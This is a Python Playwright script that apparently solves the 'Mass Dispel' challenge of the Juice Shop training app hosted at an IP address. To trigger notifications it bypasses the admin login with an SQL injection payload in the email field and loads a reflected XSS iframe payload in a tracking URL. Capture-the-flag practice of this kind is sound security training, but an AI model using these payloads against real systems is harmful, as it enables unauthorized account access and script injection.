#!/usr/bin/env python3
"""
Mass Dispel Challenge Proper Solver
Trigger multiple notifications and dismiss them at once
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_mass_dispel():
    """Properly solve Mass Dispel by triggering and dismissing multiple notifications"""
    
    print("🔔 MASS DISPEL CHALLENGE - PROPER SOLUTION")
    print("=" * 60)
    print("Goal: Close multiple 'Challenge solved'-notifications in one go")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser to see notifications
        page = browser.new_page()
        
        # Navigate to site
        print("\n📍 Step 1: Navigate to Juice Shop...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Close any existing notifications first
        print("\n📍 Step 2: Clearing any existing notifications...")
        page.keyboard.press("Escape")
        time.sleep(1)
        
        print("\n📍 Step 3: Triggering multiple challenges rapidly...")
        print("   This will create multiple notification popups")
        
        # We need to trigger multiple challenges that will show notifications
        # These should be challenges that aren't solved yet
        
        # First, check which challenges are unsolved
        session = requests.Session()
        login_resp = session.post(
            f"{TARGET}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        
        if login_resp.status_code == 200:
            token = login_resp.json()['authentication']['token']
            session.headers['Authorization'] = f'Bearer {token}'
        
        resp = session.get(f"{TARGET}/api/Challenges/")
        unsolved = []
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            unsolved = [c for c in challenges if not c.get('solved')]
            print(f"   Found {len(unsolved)} unsolved challenges to trigger")
        
        # Quick challenges to trigger
        quick_triggers = [
            # Admin Section - just navigate
            ("/#/administration", "Admin Section"),
            # Zero Stars - submit 0-star review
            ("submit_zero_stars", "Zero Stars"),
            # Missing Encoding - access image with emoji
            ("/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg", "Missing Encoding"),
            # Reflected XSS
            ("/#/track-result?id=<iframe src=\"javascript:alert('xss')\">", "Reflected XSS"),
            # Web3 Sandbox
            ("/#/web3", "Web3 Sandbox")
        ]
        
        # Execute multiple triggers without waiting between them
        print("\n   Triggering challenges in rapid succession...")
        
        for trigger, name in quick_triggers[:4]:  # Trigger 4 challenges quickly
            try:
                print(f"      - Triggering: {name}")
                
                if trigger == "submit_zero_stars":
                    # Special case: submit 0-star review
                    page.goto(f"{TARGET}/#/", wait_until="domcontentloaded", timeout=3000)
                    # Find first product and try to submit 0 stars
                    # This would need more complex interaction
                else:
                    # Navigate to trigger URL
                    page.goto(f"{TARGET}{trigger}", wait_until="domcontentloaded", timeout=3000)
                
                # Don't wait - immediately trigger the next one
            except:
                pass
        
        # Wait a moment for all notifications to appear
        time.sleep(3)
        
        print("\n📍 Step 4: Looking for multiple notifications...")
        
        # Check for notification elements
        notification_selectors = [
            'simple-notification',
            '.challenge-solved-toast',
            '.mat-snack-bar-container',
            '[class*="notification"]',
            '[class*="toast"]'
        ]
        
        notifications_found = 0
        for selector in notification_selectors:
            elements = page.locator(selector).all()
            if elements:
                notifications_found += len(elements)
                print(f"   Found {len(elements)} notifications with selector: {selector}")
        
        print(f"\n🎯 Total notifications visible: {notifications_found}")
        
        if notifications_found >= 2:
            print("\n📍 Step 5: Dismissing all notifications at once...")
            
            # The key is to dismiss them all in ONE action
            
            # Method 1: Press ESC to dismiss all
            print("   Method 1: Pressing ESC key...")
            page.keyboard.press("Escape")
            time.sleep(1)
            
            # Check if they're gone
            remaining = 0
            for selector in notification_selectors:
                elements = page.locator(selector).all()
                remaining += len(elements)
            
            if remaining == 0:
                print("   ✅ All notifications dismissed with ESC!")
            else:
                # Method 2: Click overlay/backdrop
                print("   Method 2: Clicking overlay...")
                overlay = page.locator('.cdk-overlay-backdrop').first
                if overlay.is_visible():
                    overlay.click()
                    time.sleep(1)
                
                # Method 3: Press X key (common dismiss key)
                print("   Method 3: Pressing X key...")
                page.keyboard.press("x")
                time.sleep(1)
                
                # Method 4: Click outside notifications
                print("   Method 4: Clicking outside...")
                page.mouse.click(10, 10)
        else:
            print("\n⚠️ Need more notifications visible at once")
            print("   Trying different approach...")
            
            # Alternative: Open multiple tabs/windows with challenges
            print("\n📍 Alternative: Opening multiple challenge URLs simultaneously...")
            
            # Open multiple pages in new tabs
            for i in range(3):
                new_page = browser.new_page()
                new_page.goto(f"{TARGET}/#/score-board", wait_until="domcontentloaded")
                time.sleep(0.5)
                new_page.close()
        
        # Take screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/mass_dispel_solved.png")
        print("\n📸 Screenshot saved: mass_dispel_solved.png")
        
        browser.close()
    
    # Check if solved
    print("\n📊 Checking if Mass Dispel is solved...")
    
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            mass_dispel = next((c for c in challenges if 'Mass Dispel' in c.get('name', '')), None)
            
            if mass_dispel:
                if mass_dispel.get('solved'):
                    print(f"\n✅ SUCCESS! Mass Dispel SOLVED!")
                    print(f"   The challenge is now marked as green/completed")
                    return True
                else:
                    print(f"\n⚠️ Mass Dispel not solved yet")
                    print("   Need to have multiple notifications visible and dismiss them all at once")
    
    print("\n💡 The key is:")
    print("   1. Have 2+ challenge notifications visible at the same time")  
    print("   2. Dismiss them all with a single action (ESC key, click outside, etc.)")
    print("   3. The dismissal must happen while multiple are still visible")
    
    return False

if __name__ == "__main__":
    solve_mass_dispel()